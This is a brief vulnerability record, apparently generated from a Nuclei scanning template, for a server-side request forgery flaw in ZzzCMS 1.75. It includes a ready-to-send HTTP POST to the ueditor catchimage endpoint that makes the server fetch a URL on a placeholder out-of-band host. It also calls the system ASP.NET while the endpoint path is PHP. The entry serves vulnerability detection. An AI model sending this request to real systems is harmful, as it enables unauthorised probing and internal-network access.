# Vulnerability: ZzzCMS 1.75 - Server-Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`zzzcms-ssrf.yaml`)

## Description
ZzzCMS (A Lightweight ASP.NET content management system) is vulnerable to SSRF(Server-Side Request Forgery).

## Vulnerable Code Pattern / Exploit Payload
```http
POST /plugins/ueditor/php/controller.php?action=catchimage&upfolder=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

source[0]=http://{{interactsh-url}}/{{filename}}.txt
```

